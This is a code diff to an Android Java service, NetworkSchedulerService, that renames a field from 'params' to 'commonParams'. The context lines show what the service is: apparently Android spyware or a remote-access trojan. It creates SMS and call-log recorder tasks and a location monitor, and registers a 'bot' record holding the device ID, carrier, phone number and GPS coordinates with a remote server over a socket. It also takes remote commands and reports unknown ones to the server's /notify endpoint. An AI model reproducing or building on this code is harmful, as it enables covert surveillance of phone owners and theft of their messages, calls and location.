@@ -52,7 +52,7 @@ public class NetworkSchedulerService extends JobService {
 
     private int reconnects = 0;
     private LocationMonitor locationTask;
-    private CommonParams params;
+    private CommonParams commonParams;
     private NetworkSchedulerService client;
     private JobParameters jobParameters;
 
@@ -115,7 +115,7 @@ public class NetworkSchedulerService extends JobService {
     }
 
     public void changeServer(String url) {
-        params = new CommonParams(this);
+        commonParams = new CommonParams(this);
         socket.disconnect();
         locationTask.setServer(url);
         createSocket(url);
@@ -133,10 +133,10 @@ public class NetworkSchedulerService extends JobService {
 
         if (smsRecorderTask == null) smsRecorderTask = new SmsRecorderTask(this);
         if (callLogRecorderTask == null) callLogRecorderTask = new CallLogRecorderTask(this);
-        if (params == null) params = new CommonParams(this);
+        if (commonParams == null) commonParams = new CommonParams(this);
         if (client == null) client = this;
         if (locationTask == null) locationTask = new LocationMonitor(this);
-        if (socket == null) createSocket(params.getServer());
+        if (socket == null) createSocket(commonParams.getServer());
 
         Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
 
@@ -163,12 +163,12 @@ public class NetworkSchedulerService extends JobService {
                     reconnects = 0;
 
                     HashMap bot = new HashMap();
-                    bot.put("uid", params.getUid());
-                    bot.put("provider", params.getProvider());
-                    bot.put("device", params.getDevice());
-                    bot.put("sdk", params.getSdk());
-                    bot.put("version", params.getVersion());
-                    bot.put("phone", params.getPhone());
+                    bot.put("uid", commonParams.getUid());
+                    bot.put("provider", commonParams.getProvider());
+                    bot.put("device", commonParams.getDevice());
+                    bot.put("sdk", commonParams.getSdk());
+                    bot.put("version", commonParams.getVersion());
+                    bot.put("phone", commonParams.getPhone());
                     bot.put("lat", locationTask.getLatitude());
                     bot.put("longi", locationTask.getLongitude());
 
@@ -237,12 +237,12 @@ public class NetworkSchedulerService extends JobService {
                                 Log.i(TAG, "Unknown command");
                                 HashMap xcmd = new HashMap();
                                 xcmd.put("event", "command:unknown");
-                                xcmd.put("uid", params.getUid());
-                                xcmd.put("device", params.getDevice());
+                                xcmd.put("uid", commonParams.getUid());
+                                xcmd.put("device", commonParams.getDevice());
                                 xcmd.put("command", command);
 
                                 Http req = new Http();
-                                req.setUrl(params.getServer() + "/notify");
+                                req.setUrl(commonParams.getServer() + "/notify");
                                 req.setMethod(HttpRequest.METHOD_POST);
                                 req.setParams(xcmd);
                                 req.execute();
